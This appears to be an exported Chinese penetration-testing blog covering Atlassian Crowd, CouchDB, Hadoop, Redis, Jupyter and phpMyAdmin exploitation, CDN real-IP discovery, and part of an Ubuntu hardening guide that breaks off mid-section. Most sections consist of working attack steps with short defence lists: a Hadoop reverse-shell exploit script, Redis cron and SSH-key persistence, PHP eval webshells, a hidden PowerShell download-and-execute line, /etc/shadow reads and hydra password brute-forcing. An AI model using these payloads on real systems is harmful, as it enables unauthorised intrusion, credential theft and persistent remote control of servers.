Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限\n\n\n#### 环境搭建\n```bash\nwget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip\nunzip atlassian-crowd-3.4.3.zip\n\ncd atlassian-crowd-3.4.3\nvim crowd-webapp/WEB-INF/classes/crowd-init.properties    #修改crowd-init.properties 配置文件，设置主目录\n    crowd.home=/var/crowd-home    # 主目录位置(根据自己的写)\n\n# 执行启动命令\n./start_crowd.sh\n```\n浏览器访问`http://192.168.0.100:8095` 点击`Set up Crowd`\n这里去官网申请试用30天`https://my.atlassian.com/products/index`并填写到license 进行下一步安装,直到安装完成。\n\n\n###### 未授权访问测试\n安装完成之后在插件目录会有一些插件`bundled-plugins`\n上传一个标准的插件,来自atlassian-bundled-plugins中的`applinks-plugin-5.4.12.jar`\n```bash\ncurl --form \"file_cdl=@applinks-plugin-5.4.12.jar\" http://192.168.0.100:8095/crowd/admin/uploadplugin.action -v\n```\n\n\n###### Atlassian Crowd RCE\n该漏洞源于网络系统或产品未对输入的数据进行正确的验证。受影响的产品及版本包括：Atlassian Crowd 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本；Atlassian Crowd Data Center 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本。\n\n漏洞利用脚本：`https://github.com/jas502n/CVE-2019-11580`\n```bash\ngit clone https://github.com/jas502n/CVE-2019-11580\ncd CVE-2019-11580/\npython CVE-2019-11580.py http://192.168.0.100:8095\n\n# 通过浏览器访问链接测试其他命令\ncurl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow\n```\n\n\n\n\n#### 防御手段\n- 设置访问`/crowd/admin/uploadplugin.action`的源ip\n- 升级最新版本(3.5.0以上)。\n\n\n\n\n\n\n\n\n","tags":["远程命令执行"],"categories":["渗透测试"]},{"title":"CouchDB未授权访问&命令执行","url":"%2Fposts%2F78%2F","content":"\n#### 漏洞简介以及危害\nApache CouchDB是一个开源数据库,专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式,JavaScript作为查询语言,MapReduce和HTTP作为API的NoSQL数据库。\n应用广广泛,如BBC用在其动态内容展示平台,Credit Suisse用在其内部的商品部⻔的市场框架,Meebo,用在其社交平台(web和应用程序),默认会在`5984端口`开放Restful的API接口口,如果使用\nSSL的话就会监听在`6984端口`,用于数据库的管理功能。其HTTP Server默认开启时没有进行行行验证,而且绑定在0.0.0.0,所有用户均可通过API访问导致未授权访问。\n在官方方配置文文档中对HTTP Server的配置有WWW-Authenticate:Set this option to trigger\nbasic-auth popup on unauthorized requests,但是很多用户都没有这么配置,导致漏洞产生。\n\n在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置`query_server`，这个配置项在设计、执行view的时候将被运行。\n\n影响版本：小于 1.7.0 以及 小于 2.1.1\n\n\n#### 漏洞环境\nvulnhub\n\n#### 漏洞利用\nCVE-2017-12636是需要登录用户方可触发，如果不知道目标管理员密码，可以利CVE-2017-12635[CVE-017-12635](https://blog.csdn.net/JiangBuLiu/article/details/94027581)先【增加一个管理员用户】，如果无须帐号密码，就可通过未授权访问进行命令执行\n同样，记得在Burp的拦截端口添加一个5984\n\n\n进入环境，并启动\n```bash\ncd couchdb/CVE-2017-12636/\ndocker-compose up -d\n```\n\n\n###### 未授权访问测试\n```bash\ncurl http://192.168.0.100:5984\ncurl http://192.168.0.100:5984/_config\n```\n\n<img src=\"http://image.xpshuai.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE1.png\"></img>\n\n###### 任意命令执行漏洞\n\n```bash\n# 本机python运行http服务(可以不运行这个步骤，这里只是做curl测试用的)\npython -m SimpleHTTPServer 8888\n```\n\n1.6.0 下\n\n```bash\n#依次执行如下命令\ncurl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '\"curl http://192.168.0.105:8888/test.php\"' # 这里可以执行任意命令\n#curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '\" cat /etc/passwd >> tmp/ext_passwd\"' \ncurl -X PUT 'http://192.168.0.100:5984/vultest'    # 添加一个Database和Document\ncurl -X PUT 'http://192.168.0.100:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}'\ncurl -X POST 'http://192.168.0.100:5984/vultest/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json'      # 在这个Database里查询，将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行\n```\n\n2.1.0 下\n```bash\n# 2.1.0中修改了1.6.0用到的两个API\n# Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。我们带上账号密码访问/_membership即可\ncurl http://<your-ip>:5984/_membership\n\n# 利用(跟1.6.0类似)\ncurl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/CVE-2017-12636_is_success\"'\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'    #先增加一个Database和一个Document\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}'\n#Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view\ncurl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\"\n#增加_view的同时即触发了query_servers中的命令。\n```\n\n<img src=\"http://image.xpshuai.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE2.png\"></img>\n\nexp地址\n\n```\nhttps://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py\n```\n\n**nmap扫描**\n\n```bash\nnmap -p 5984 --script \"couchdb-stats.nse\" <target_ip>\n```\n\n\n#### 防御手段\n- 绑定指定ip\n- 设置访问密\n","tags":["CVE-2017-12636"],"categories":["渗透测试"]},{"title":"Hadoop未授权访问漏洞","url":"%2Fposts%2F59457%2F","content":"\n\n#### 漏洞简介以及危害\nHadoop是一个由Apache基金会所开发的分布式系统基础架构,由于服务器器直接在开放了了\nHadoop 机器器 HDFS 的 50070 web 端口及部分默认服务口口,黑客可以通过命令行操作多个目录下\n的数据,如进行删除,下载,目录浏览甚至命令行行等操作,产生极大的危害。\n\n\n\n#### 环境\nvulnhub\n\n\n\n#### 测试\n启动环境\n```bash\ndocker-compose up -d\n```\n\n访问\n```\nhttp://192.168.0.100:8088/cluster\n```\n![](http://image.xpshuai.cn/Hadoop.png)\n\n\n**通过REST API命令执行**\n利用过程：\n在本地监听端口 > 创建Application > 调用Submit Application API提交\n1.本机监听\n```bash\nnc -lvvp 8888\n```\n\n2.直接本机执行EXP：`python exp.py`\n```python\nimport requests\ntarget = 'http://192.168.0.100:8088/'\nlhost = '192.168.0.105' # put your local host ip here, and listen at port 8888\nurl = target + 'ws/v1/cluster/apps/new-application'\nresp = requests.post(url)\napp_id = resp.json()['application-id']\nurl = target + 'ws/v1/cluster/apps'\ndata = {\n'application-id': app_id,\n'application-name': 'get-shell','am-container-spec': {\n'commands': {\n'command': '/bin/bash -i >& /dev/tcp/%s/8888 0>&1' % lhost,\n},\n},\n'application-type': 'YARN',\n}\nrequests.post(url, json=data)\n\n```\n\n3.反弹shell成功\n![](http://image.xpshuai.cn/Hadoop_shell.png)\n\n\n#### 防御手段\n- 如无必要, 关闭 Hadoop Web 管理⻚面。\n- 开启身份验证 ,防止未经授权用户访问。\n- 设置“安全组”访问控制策略,将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访包括 50070 以及 WebUI 等相关端口。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Hadoop"],"categories":["渗透测试"]},{"title":"redis漏洞利用","url":"%2Fposts%2F6%2F","content":"\n\n## 准备\n1.下载编译\n```bash\nwget http://download.redis.io/releases/redis-6.0.3.tar.gz\ntar xzf redis-6.0.3.tar.gz\ncd redis-6.0.3\nmake\n```\n\n2.拷贝二进制文件\n```bash\ncd src/\n\ncp redis-server /usr/bin \ncp redis-cli /usr/bin\n\ncd ..\ncp redis.conf /etc/\n```\n\n3.修改`redis.conf`, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴)\n\n<img src=\"http://image.xpshuai.cn/20200525210801776_1038672757.png\"/>\n\n4.启动redis服务\n\n```bash\nredis-server  /etc/redis.conf\n\n# 或者直接以非保护模式运行也可以\n./redis_server --protected-mode no\n```\n\n\n\n5.连接redis的方式\n```bash\n# nc\nnc 1.1.1.1.10 6379 -vv    \n\n# telent \n\n#或redis-cli连接\nredis-cli -h 192.168.0.100\n```\n\n\n\n常用命令\n```bash\n# 查看里面的key和其对应的值\nkeys *  \nget key\n\n\n# 获取备份路径\nconfig get dir\n\n# 获取备份文件名\nconfig get dbfilename\nsave  # 保存数据到备份路径(dir+dbfilename)\n\n# 设置备份路径\nconfig set dir /root/ # 可以移动到root，然后访问（如果能访问，就是root权限 -->可用来判断权限）\n\n# 设置备份文件名\nconfig set dbfilename filename\n\n# 设置键值对\nset keyname value\n# 获取键值对\nget keyname\n\n# 持久化(保存到磁盘)\nsave\n```\n\n\n## 测试\n#### 一、写文件(利用未授权访问)\n测试环境：centos\n\n###### 1.crontab计划任务反弹shell\n>root权限运行redis\n\n1.本机监听端口\n```bash\nnc -lvvp 4444\n```\n\n2.利用redis生成计划任务配置文件\n```bash\nset -.- \"\\n\\n\\n* * * * * bash -i >& /dev/tcp/192.168.0.106/5555 0>&1\\n\\n\\n\"\nconfig set dir /var/spool/cron/\nconfig set dbfilename root\nsave\n```\n\n3.本机获得反弹shell\n\n**Note:**\n当目标主机为centos时可以反弹shell, 而ubuntu和debian均无法成功反弹shell。\n原因：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划。\n\n\n\n###### 2.直接写入公钥\n>root权限运行redis， 且目标主机开启了ssh密钥登录\n\n```bash\n# 本机先生成密钥\nssh-keygen -t rsa\n# 公钥内容导入key.txt文件\n(echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa.pub; echo -e \"\\n\\n\") > key.txt\n\n#\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nset test6 \"\\n\\n\\nssh key\\n\\n\\n ssh-rsa xxxxxxxxxxxxx\" (公钥的值)\nsave\n\n# 然后本机直接连接目标\nssh  -o StrictHostKeyChecking=no 192.168.0.100\n```\n\n同时也要注意系统的乱码问题\n\n<img src=\"http://image.xpshuai.cn/20200525224703847_1050926657.png\"/>\n\n\n###### 3.低权限写入WebShell\n>需要知道网站路径\n\n```bash\nconfig set dir /var/www/html/    # 需要知道网站的绝对路径\nconfig set dbfilename 1.php\nset 1 \"<?php eval($_POST[1]); ?>\"\nsave\n\n# 访问webshell\n```\n<img src=\"http://image.xpshuai.cn/20200525222440751_1498038879.png\"/>\n\n\n###### 4.开机自启目录\n>前提：redis部署在windows主机上\n\n```bash\n# 写入批处理文件到Administrator用户的开机启动目录\n# 使用powershell远程下载执行我们的程序\nconfig set dir \"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/\"\nconfig set dbfilename add.bat\nset xx \"\\r\\n\\r\\npowershell.exe -nop -w hidden -c \\\"IEX((New-ObjectNet.WebClient).DownloadString('http://xxx.xx.xxxx/add'))\\\"\\r\\n\\r\\n\"\nsave\n```\n\n\n\n**拓展攻击方法**\n- 信息泄漏(很多redis没设置密码，寻找敏感信息)\n- 配合ssrf\n- 本地lua代码\n- 本地提权\n- 等等\n\n###### 5.写入挖矿进程\n\n\n###### nmap检测\n```bash\nnmap -p 6379 --script redis-info 192.168.0.100\n#地址:https://svn.nmap.org/nmap/scripts/redis-info.nse\n```\n<img src=\"http://image.xpshuai.cn/20200525225557672_1832619508.png\"/>\n\n\n######  安全检查\n```bash\n#1.查看redis运行的用户权限\nps -aux |grep redis\n\n#2.查看所有用户ssh验证文件是否异常\n/user/.ssh/authorized_keys\n\n#3.查看crontab\n/var/spoof/cron/\n\n#4.查看crontab的日志\ntail /var/log/cron\n```\n\n\n\n#### 二、Redis-RCE\n利用用前提是获取redis访问权限,也就是基于redis未授权访问\n\n###### 1.redis主从同步rce\n>使用范围redis 4.x-5.0.5\n\n在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令\n```bash\ngit clone https://github.com/Ridter/redis-rce.git\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git\n\n# 编译so文件\ncd RedisModules-ExecuteCommand/\nmake\n\n# 运行sss\npython redis-rce.py -r <目标地址>  -L <本机地址> -f module.so\n# 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell\n```\n\n\n###### 2.反序列化rce\n当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。\n```\njackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如[\"com.blue.bean.User\",xxx]\nfastjson：关注有没有 @type 字段\njdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名\n```\nhttps://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q\n\n\n\n###### 3.lua rce\n>适用于高权限运行低版本redis的lua虚拟机，写文件失败时进行尝试\n\n使用`info server` 和 `eval “return _VERSION” 0 `命令可以查看当前redis版本和编译信息。\n\nexp\n```\nhttps://github.com/QAX-A-Team/redis_lua_exploit/\n```\n\n修改`redis_lua.py`中目标地址为靶机的地址和端口\n\n<img src=\"http://image.xpshuai.cn/20200526092701919_308935847.png\"/>\n\n运行exp\n\n执行成功后就可以进行命令执行了，这里反弹shell\n```bash\neval \"tonumber('/bin/bash -i >& /dev/tcp/192.168.0.105/5555 0>&1', 8)\" 0\n```\n\n\n#### 三、redis密码爆破\n\n1.使用redis-cli连接，使用-a参数指定密码操作。\n```bash\nredir-cli -h 192.168.0.100 -a admin123\n# 这个好像没这么实用感觉，也许可以写成脚本批量跑\n```\n\n\n2.msf的`auxiliary/scanner/redis/redis_login`模块\n```bash\nuse auxiliary/scanner/redis/redis_login\nset rhost ...\nset threads ...\nset pass_file xxxxxxx.txt\nrun\n```\n<img src=\"http://image.xpshuai.cn/20200526094633220_1454687311.png\"/>\n\n3.hydra\n```bash\n# 还是hydra好用，速度还快\nhydra -P redis_pass.txt redis://192.168.0.100\n```\n<img src=\"http://image.xpshuai.cn/20200526095113424_1824777352.png\"/>\n\n\n## 防御手段\n- 禁止root运行redis\n- 设置账户密码认证\n- 服务部署使用单独低权限账户\n- 添加IP访问限制(bind),并更更改默认6379端口\n- redis在默认情况下，是不会生成日志文件的，所以需要修改配置文件，让redis生成日志，以及设置日志等级\n- 保证 authorized_keys 文件的安全（`chmod 400 ~/.ssh/authorized_keys`）\n- 设置防火墙策略　\n\n\n**参考链接**\nhttps://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q\nhttps://www.freebuf.com/column/158065.html\n","tags":["redis"],"categories":["渗透测试"]},{"title":"Jupyter Notebook 未授权访问漏洞简单复现","url":"%2Fposts%2F59687%2F","content":"\n\n#### 简介及危害\nJupyter Notebook(此前被称为 IPython notebook)是一一个交互式笔记本,支支持运行行行 40 多种编\n程语言言。 如果管理理员未为Jupyter Notebook配置密码,将导致未授权访问漏漏洞洞,游客可在其中创建一一\n个console并执行行行任意Python代码和命令。\n\n\n#### 环境介绍\n```bash\n# 目标\n环境来源：https://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/\nip地址： 192.168.0.100\n```\n\n\n#### 开始测试\n1.运行测试环境：\n```bash\ndocker-compose up -d\n```\n\n2.访问目标地址 http://192.168.0.100:8888\n\n3.New > Terminal 创建控制台：可以直接执行任意命令\n![](http://image.xpshuai.cn/smurf%E6%94%BB%E5%87%BB.png)\n\n4.后面就直接执行任意命令，比如反弹shell等\n```bash\n# 本机监听\nnc -lvp 5555\n\n# 目标执行\nbash -i >& /dev/tcp/x.x.x.x/8080 0>&1\n```\n\n\n#### 防御手段\n- 开启身份验证, 防止止未经授权用用户访问\n- 访问控制策略略, 限制IP访问, 绑定固定IP\n","tags":["Jupyter Notebook"],"categories":["渗透测试"]},{"title":"phpMyAdmin突破secure-file-priv写WebShell","url":"%2Fposts%2F64672%2F","content":"\n\n\n\n1.查看`secure_file_priv`值\n```bash\nshow global variables like '%secure_file_priv%';\n# show global variables like '%secure%';\n\n# 此开关默认为NULL：即不允许导入导出\n# 没有具体值时：表示不对mysqld 的导入|导出做限制\n# 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下\n```\n\n2.查询操作日志存放路径\n```bash\nshow variables like 'general_log%';\n\n# 操作日志默认也是关闭的\n```\n\n3.首先打开操作日志记录\n```bash\nset global general_log = 'ON';\n```\n\n4.设置操作记录日志路径(`前提是获取到了绝对路径`)\n```bash\n# set global general_log_file='路径地址';\n# 选择网站的目录里面\nset global general_log_file='D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\xx.php'\n```\n\n5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了\n```bash\nselect '<?php @eval($_POST[1]);?>';\n```\n\n6.访问webshell，进行后续操作\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["secure-file-priv"],"categories":["渗透测试"]},{"title":"绕过CDN寻找真实IP","url":"%2Fposts%2F58846%2F","content":"\n\n在没有CDN的情况下，直接`ping`或`nslookup`或`dig`即可得到真实IP地址，但是有的站点使用了CDN。\n两种简单检测有无CDN的方法：\n1. 多地ping\n2. nslookup 检测（如果下方域名解析出现了多个ip的话，基本就确定这个网站使用了CDN服务）\n\n\n\n#### 一、DNS历史解析记录\n相关查询网站：\n```bash\n# iphistory：\nhttps://viewdns.info/iphistory/\n# DNS查询：\nhttps://dnsdb.io/zh-cn/\n# 微步在线：\nhttps://x.threatbook.cn/\n# 域名查询：\nhttps://site.ip138.com/\n# DNS历史查询：\nhttps://securitytrails.com/\n# Netcraft：\nhttps://sitereport.netcraft.com/?url=github.com\n\n# SecurityTrail\n```\n\n\n\n#### 二、查找子域名\n重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。\n**常用的子域名查找方法和工具：**\n1、搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，`site:baidu.com inurl:baidu.com`，搜target.com|公司名字。\n\n2、一些在线查询工具，如：\n```bash\nhttp://tool.chinaz.com/subdomain/\nhttp://i.links.cn/subdomain/    \nhttp://subdomain.chaxun.la/\nhttp://searchdns.netcraft.com/\nhttps://www.virustotal.com/\nhttps://dnsdb.io/zh-cn/\nhttps://x.threatbook.cn/\n```\n\n3、 子域名爆破工具\n```bash\nLayer子域名挖掘机\nwydomain：https://github.com/ring04h/wydomain    \nsubDomainsBrute:https://github.com/lijiejie/\nSublist3r:https://github.com/aboul3la/Sublist3r\n其他工具\n```\n\n\n\n#### 三、网站邮件头信息\n邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，`查看邮件头信息`，获取到网站的真实IP。\n\n\n#### 四、网络空间安全引擎搜索\n关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP\n```bash\n# 钟馗之眼：\nhttps://www.zoomeye.org\n# Shodan：\nhttps://www.shodan.io\n# Fofa：\nhttps://fofa.so\n# 其他\n```\n\n\n#### 五、利用SSL证书寻找真实IP\n证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。\n**SSL证书搜索引擎：**\n```bash\n# Censys 证书搜索\nhttps://censys.io/ipv4?q=github.com\n# 其他\n```\n\n\n\n#### 六、国外主机解析域名\n大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有\n\n1.国外多地ping工具：\n```bash\nhttps://asm.ca.com/zh_cn/ping.php\nhttp://host-tracker.com/\nhttp://www.webpagetest.org/\nhttps://dnscheck.pingdom.com/\n```\n\n2.自己挂代理\n\n\n\n#### 七、扫描全网\n通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP\n\n1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。\n```\nhttps://github.com/zmap/zmap\n```\n2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。\n```\nhttps://github.com/robertdavidgraham/masscan\n```\n\n扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。\n\n\n\n#### 八、配置不当导致绕过\n在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。\n\n案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。\n\n案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。\n\n\n#### 九、遗留文件\n遗留文件（比如google镜像，百度镜像）\n比如遗留文件中: phpinfo的`server_ddr`字段， `http_x_forwarded_for`  \n\n\n\n#### 十、其他工具\n```bash\n# fuckcdn\nhttps://github.com/Tai7sy/fuckcdn\n\n# w8fuckdn\nhttps://github.com/boy-hack/w8fuckcdn\n```\n\n\n\n\n#### 十一、以量打量\n以量打量（需要肉鸡，cdn的流量用完就显示真实ip）\n\n>ps：这个方法，额，也算是个方法吧......\n\n\n\n#### 十二、其他方法\n**1.网站漏洞**\n比如有代码执行漏洞、SSRF、存储型的XSS都可以`让服务器主动访问我们预设的web服务器`，那么就能在日志里面看见目标网站服务器的真实IP\n\n**2.配合本地hosts文件**\n用超级ping 扫子域名 再继续、 及get-site-ip获取 (修改host的映射，如能正常访问，这ip就是正确的，进一步使用代理来找出真是ip)\n\n\n#### 十三、一键干死CDN\n>包含了夸张因素，针对大公司的效果比较好，体量小的网站，基本搜不到\n\n1.先查看网站logo的hash值\n这里python2来计算：\n```python\nimport mmh3   # mmh3安装需要先安装vc++4.0\nimport requests\nresponse = requests.get('https://www.xiaodi8.com/img/favicon.ico')\nfavicon = response.content.encode('base64')\nhash = mmh3.hash(favicon)\nprint 'http.favicon.hash:'+str(hash)\n\n# 可以ico文件，也可以是其他特征明显的图片等\n```\n\n2.然后shodan搜索：\n```bash\n# 对特征明显的图片等的hash进行搜索\nhttp.favicon.hash:-1507567567\n```\n\n\n\n\n参考文章\n```bash\nhttps://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw   # ByPass, 我在此基础上补充了自己之前的内容\nhttps://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html  # 通过shodan搜索相同favicon.ico的网站\nhttps://www.cnblogs.com/miaodaren/p/9177379.html        # Shodan的http.favicon.hash语法详解与使用技巧\n```\n\n\n","tags":["CDN"],"categories":["渗透测试"]},{"title":"ubuntu server-安全相关设置","url":"%2Fposts%2F19808%2F","content":"\n\n# 142-安全设置\n\nLinux默认安装已经很安全，当很多的了解安全仍非常必要\n打造一个相当安全的系统（增加入侵者的成本，安全也是要考虑成本的）\n\n大部分的安全事件来自于内部员工和已经离职的员工\n\n<img src=\"http://image.xpshuai.cn/20200519144331629_1148039304.png\" />\n\n\n#### 防护思路\n- 风险评估：攻击面\n- 制定策略：最小化、明确需求\n- 安全管理：安全是管理\n- 应急预案：突发事件\n- 威胁情报：了解安全行业\n\n#### 常见错误理解\n- 安全是安全从业者的事情\n- 为了安装简单，装所有的包，开所有的服务(版本号、banner信息)\n- 有了边界防火墙则不需要主机防火墙\n- 随意开放各种访问方式(后门)\n- 公司内部网络是安全的\n\n\n## <font color=red>帐号管理</font>\n**用户管理是系统安全最重要的方面**\n- 密码策略\n- 权限控制\n\n**Ubuntu默认禁用root帐号**\n使用不匹配任何加密值的密码，无法直接登陆(sudo)\n设置密码之后即可启用root登录\n安装过程创建的用户帐号默认属于sudo组\n```bash\nsudo passwd  # 设置root密码(还是不建议使用root登录系统)\nsudo passwd -l root  # 禁用root帐号密码(用完之后解锁: -u) sudo passwd -u root \n```\n\n**增加管理员帐号**\n```bash\nsudo usermod -aG sudo xps    # 加入sudo组\nsudo viudo    # 本质是编辑 /etc/sudoers\nsudo su\n# 尽量减少管理员帐号数量\n# 离职手续办完之前，要把他的帐号禁用然后逐渐删除\n```\n\n**多用户环境下，用户主目录默认权限是全局可读**\n```bash\nls -ld /home/username\n# 手动修改权限(不建议-R，会有一些使用的问题)\nsudo chmod 0750 /home/username\n# 预先修改配置（新添加的帐号权限都确定了）\nsudo vi /etc/adduser.conf\n    DIR_MODE=0750\n# 再添加用户，主目录权限就是我们规定的了\nsudo adduser username\n```\n\n\n**密码复杂度**\n```bash\n# 使用sudo设置密码时 不受密码规则限制\n# 编辑配置文件\nsudo vi /etc/pam.d/common-password\n    password    [success=1 default=ignore]  pam_unix.so obscure sha512 minlen=8 lcredit=1 ucredit=1 dcredit=2 ocredit=1\n\n# minlen 最小长度\n# lcredit 最少包含的小写字母个数\n# ucredit 最少包含的大写字母个数\n# dcredit 最少包含的数字个数\n# ocredit 最少包含的其他字符个数\n```\n\n**密码过期**\n```bash\nsudo chage -l username    # 查看用户帐号\n# 设置密码过期时间\nsudo chage -E 01/31/2015 -m 5 -M 90 -I 30 -W 14 username\n# -E  密码过期时间\n# -m / -M     密码使用期限\n# -I    密码过期后多少天仍可以改密码，过期锁定帐号\n# -W    过期前多少天警告\n```\n\n**帐号SSH登录**\n应用和服务使用其他身份认证机制，需要单独配置帐号安全\n锁定帐号无法是无法组织公钥认证的SSH远程登录用户\n```bash\n# 删除 .ssh目录\n~/.ssh/authorized_keys\n```\n\n禁用帐号不会强制断开`已经建立`的SSH连接\n```bash\nwho |grep username    # 查询用户 pt/num 终端\nsudo pkill -f pts/num    # 强制踢掉\n```\n\n指定可SSH远程登录的用户\n```bash\nsudo vi /etc/ssh/sshd_config    # 需重启服务生效\n    AllowGroups sshlogin    # 设置允许的组\n\n# 创建ssh登录组，创建属于sshlogin组的用户\nsudo addgroup sshlogin && sudo adduser username sshlogin\n```\n\n\n**控制台安全**\n```bash\n# 一般，启用机器后，到了登录界面，不用登录即可进行远程连接，其他服务也尅启动了\n# 避免误触，建议禁用ctrl+Alt+Delete 快捷键重启\nsudo systemctl mask ctrl-alt-del.target\nsudo systemctl daemon-reload\n```\n\n\n\n## <font color=red>系统信息</font>\n**当前登录帐号**\n```bash\n# 查看登录会话\nw\n\n# TTY1 是本地登录，pts/0 是远程终端\n# 字段： 用户-终端-来源-登录时间-发呆时间(空闲)---当前正在运行的程序\nxps@xps:~$ w\n 08:51:23 up  1:15,  3 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nxps      tty1     -                08:49    1:47   0.09s  0.04s -bash\nxps      pts/0    192.168.0.115    07:37    1.00s  0.23s  0.01s w\nxps      pts/1    192.168.0.115    08:49    3.00s  0.07s  0.03s vim 1.txt\n```\n\n**历史登录信息**\n```bash\nlast -d    # 从下往上看\n\n#xps      pts/0        bogon            Tue May 19 07:37   still logged in\n#reboot   system boot  4.15.0-99-generi Tue May 19 07:36   still running\n\n# 系统启动之后，就会显示reboot的一条记录，显示内核信息\n```\n\n**lsof命令**\nLinux中一切皆文件，运行中的文件成为进程\n目录中被打开的文件\n```bash\nsudo lsof +D /home/xps\n\nlsof |grep /var/log/   #查看/var/log/下的文件被哪些进程打开\n```\n\n用户打开的所有文件\n```bash\nsudo lsof -u xps\nsudo lsof -u ^xps    # 除了xps账户之外\n\nlsof -u 0  \t#查看uid为0的用户打开的文件（uid为0代表是root）\n```\n\n结束指定用户的所有进程\n```bash\nsudo kill -p `lsof -t -u xps`    # -t提取pid值\n```\n\n列出所有的网络连接\n```bash\nsudo lsof -i    # 类似 ss 命令\n\nlsof -i:22\t#查看22端口都有哪些进程在访问\nlsof -p 1168\t#查看1168进程号所打开的文件\nlsof -c sshd #查看sshd服务打开的文件\n```\n\n其他\n```bash\n## 利用lsof恢复已删除文件(日志被删除后可以这样)\nlsof |grep /var/log/messages #以meaages日志为例,查看状态，记住编号id\ncd /proc/xx_刚才的id/fd\nls -l\n```\n\n**suid /sgid的安全隐患**\n```bash\n# suid 在在user的x位置多了个S。在用户执行该程序时,用户的权限度是该程序文件属主的权限。\n# sgid与suid类似，只是执行程序时获得的是文件属组的权限。\n\n# 如果suid的属主为root，那任何人都可以root权限执行命令，危害太大\n\n# 找启用了suid的文件\nsudo find / -type f -perm -u=s -ls        # 如果有不应该有suid文件，需要注意\n# 找启用了guid的文件\nsudo find / -type f -perm -g=s -ls    \n# 如果员工离职，那员工的账户没被清理，被新人所沿用，就可以读取之前的文件-->因为系统靠uid识别\n# 